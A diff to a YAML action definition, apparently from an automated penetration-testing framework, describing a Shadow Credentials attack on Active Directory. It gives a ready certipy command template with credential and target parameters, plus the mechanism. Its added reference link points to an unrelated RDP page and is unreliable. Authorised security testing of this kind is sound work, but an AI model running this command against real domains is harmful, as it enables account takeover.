@@ -2,16 +2,19 @@ name: certipy_shadow
 category: ad
 description: Shadow Credentials attack via certipy
 preconditions:
-  - domain_joined
-  - has_cred
+- domain_joined
+- has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: "certipy shadow auto -u '{username}@{domain}' -p '{password}' -account '{target_user}' -dc-ip {target_ip}"
+command_template: certipy shadow auto -u '{username}@{domain}' -p '{password}' -account
+  '{target_user}' -dc-ip {target_ip}
 parser: null
 expected_effects:
-  - action_completed
+- action_completed
 falsifier:
-  pattern: "error|failed|refused|denied"
+  pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: "Adds msDS-KeyCredentialLink to target account, enabling PKINIT auth as that user. Requires GenericWrite on target."
+mechanism: Adds msDS-KeyCredentialLink to target account, enabling PKINIT auth as
+  that user. Requires GenericWrite on target.
+hacktricks_ref: network-services-pentesting/pentesting-rdp.md
